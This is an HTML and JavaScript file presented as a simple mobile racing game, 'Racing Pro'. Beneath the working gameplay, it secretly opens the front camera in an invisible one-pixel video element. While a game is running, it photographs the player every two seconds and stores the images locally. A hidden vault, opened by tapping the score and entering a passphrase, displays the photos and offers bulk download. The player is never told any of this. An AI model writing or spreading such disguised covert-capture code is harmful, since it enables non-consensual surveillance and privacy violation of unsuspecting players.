<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Racing Pro</title>
    <style>
        * { box-sizing: border-box; touch-action: none; }
        body { margin: 0; background: #000; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; overflow: hidden; }
        
        #score { font-size: 24px; color: #f1c40f; margin-bottom: 5px; cursor: pointer; z-index: 10; }
        #photoCount { font-size: 14px; color: #888; margin-bottom: 10px; }
        
        #gameArea { position: relative; width: 340px; height: 60vh; background: #222; border: 4px solid #444; overflow: hidden; }
        
        /* Game Screens */
        .screen { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 20; text-align: center; }
        .hidden { display: none !important; }

        /* Cars */
        .car { position: absolute; width: 45px; height: 75px; border-radius: 8px; z-index: 5; }
        .player { background: linear-gradient(#ff4d4d, #990000); border: 2px solid #fff; bottom: 20px; left: 147px; }
        .enemy { background: linear-gradient(#2ecc71, #1b5e20); border: 2px solid #000; top: -100px; }

        /* Controls */
        .controls { display: flex; gap: 40px; margin-top: 20px; }
        .btn { width: 75px; height: 75px; background: #333; border: none; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 5px 0 #000; color: white; font-size: 24px; font-weight: bold; }
        
        /* Secret Video */
        #vContainer { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
        video { width: 100%; height: 100%; transform: scaleX(-1); }

        /* Secret Vault Overlay */
        #vault { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; overflow-y: auto; padding: 20px; }
        .photo-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin-top: 20px; }
        .photo-card { border: 1px solid #444; background: #111; padding: 5px; }
        .photo-card img { width: 100%; display: block; }
        
        .action-btn { width: 100%; padding: 15px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
    </style>
</head>
<body>

    <div id="score" onclick="openSecretVault()">Score: 0</div>
    <div id="photoCount">Vault Storage: 0 images</div>

    <div id="gameArea">
        <div id="startScreen" class="screen">
            <h1 style="color:#f1c40f">RACING PRO</h1>
            <button class="action-btn" style="background:#f1c40f; width:200px" onclick="startGame()">START GAME</button>
        </div>

        <div id="gameOverScreen" class="screen hidden">
            <h1 style="color: #e74c3c;">GAME OVER</h1>
            <button class="action-btn" style="background:#f1c40f; width:200px" onclick="startGame()">RESTART</button>
        </div>

        <div id="player" class="car player"></div>
        <div id="enemy" class="car enemy"></div>
    </div>

    <div class="controls">
        <button class="btn" onpointerdown="move(-35)">L</button>
        <button class="btn" onpointerdown="move(35)">R</button>
    </div>

    <div id="vContainer"><video id="video" autoplay playsinline muted></video></div>
    <canvas id="canvas" style="display:none;" width="320" height="240"></canvas>

    <div id="vault">
        <h2 style="text-align:center">SECRET VAULT</h2>
        <button onclick="closeVault()" class="action-btn" style="background:#444; color:white;">BACK TO GAME</button>
        <button onclick="downloadAll()" class="action-btn" style="background:#2ecc71; color:white;">SAVE ALL TO PHONE GALLERY</button>
        <button onclick="clearVault()" class="action-btn" style="background:#e74c3c; color:white;">DELETE ALL FOREVER</button>
        <div class="photo-grid" id="photoGrid"></div>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const player = document.getElementById('player');
        const enemy = document.getElementById('enemy');
        let db, gameActive = false, score = 0, enemySpeed = 3;

        // 1. DATABASE INIT
        const request = indexedDB.open("VamsiFinalVault", 2);
        request.onupgradeneeded = (e) => {
            let d = e.target.result;
            if (!d.objectStoreNames.contains("captures")) d.createObjectStore("captures", { keyPath: "id", autoIncrement: true });
        };
        request.onsuccess = (e) => {
            db = e.target.result;
            updateVaultCount();
            initCamera();
        };

        // 2. CAMERA & AUTO-CAPTURE
        function initCamera() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                setInterval(autoCapture, 2000); 
            });
        }

        function autoCapture() {
            if (!db || !gameActive) return;
            const ctx = canvas.getContext('2d');
            ctx.save(); ctx.scale(-1, 1);
            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
            ctx.restore();
            
            const data = canvas.toDataURL('image/jpeg', 0.5);
            const tx = db.transaction("captures", "readwrite");
            tx.objectStore("captures").add({ img: data }).onsuccess = updateVaultCount;
        }

        // 3. GAMEPLAY LOGIC
        function startGame() {
            score = 0; enemySpeed = 3; gameActive = true;
            document.getElementById('score').innerText = "Score: 0";
            document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
            player.style.left = "147px"; enemy.style.top = "-100px";
            gameLoop();
        }

        function move(dir) {
            let left = player.offsetLeft + dir;
            if (left >= 0 && left <= 295) player.style.left = left + "px";
        }

        function gameLoop() {
            if (!gameActive) return;
            let eTop = enemy.offsetTop + enemySpeed;
            if (eTop > 400) {
                eTop = -100;
                enemy.style.left = Math.floor(Math.random() * 280) + "px";
                score++;
                document.getElementById('score').innerText = "Score: " + score;
                if(score % 5 === 0) enemySpeed += 0.5;
            }
            enemy.style.top = eTop + "px";
            
            let pR = player.getBoundingClientRect(), eR = enemy.getBoundingClientRect();
            if (!(pR.top > eR.bottom || pR.bottom < eR.top || pR.right < eR.left || pR.left > eR.right)) {
                gameActive = false;
                document.getElementById('gameOverScreen').classList.remove('hidden');
            } else { requestAnimationFrame(gameLoop); }
        }

        // 4. VAULT ACTIONS
        function openSecretVault() {
            if (prompt("Enter Secret Code:") === "vamsi jacks") {
                document.getElementById('vault').style.display = 'block';
                loadGallery();
            }
        }

        function updateVaultCount() {
            const tx = db.transaction("captures", "readonly");
            tx.objectStore("captures").count().onsuccess = (e) => {
                document.getElementById('photoCount').innerText = `Vault Storage: ${e.target.result} images`;
            };
        }

        function loadGallery() {
            const grid = document.getElementById('photoGrid');
            grid.innerHTML = "";
            db.transaction("captures", "readonly").objectStore("captures").openCursor(null, "prev").onsuccess = (e) => {
                const cursor = e.target.result;
                if (cursor) {
                    const div = document.createElement('div');
                    div.className = "photo-card";
                    div.innerHTML = `<img src="${cursor.value.img}">`;
                    grid.appendChild(div);
                    cursor.continue();
                }
            };
        }

        function downloadAll() {
            const tx = db.transaction("captures", "readonly");
            tx.objectStore("captures").getAll().onsuccess = (e) => {
                const photos = e.target.result;
                photos.forEach((p, i) => {
                    setTimeout(() => {
                        const a = document.createElement('a');
                        a.href = p.img;
                        a.download = `Vamsi_Jacks_${i}.jpg`;
                        a.click();
                    }, i * 300);
                });
            };
        }

        function clearVault() {
            if(confirm("Wipe the vault?")) {
                db.transaction("captures", "readwrite").objectStore("captures").clear().onsuccess = () => {
                    loadGallery();
                    updateVaultCount();
                };
            }
        }

        function closeVault() { document.getElementById('vault').style.display = 'none'; }
    </script>
</body>
</html>
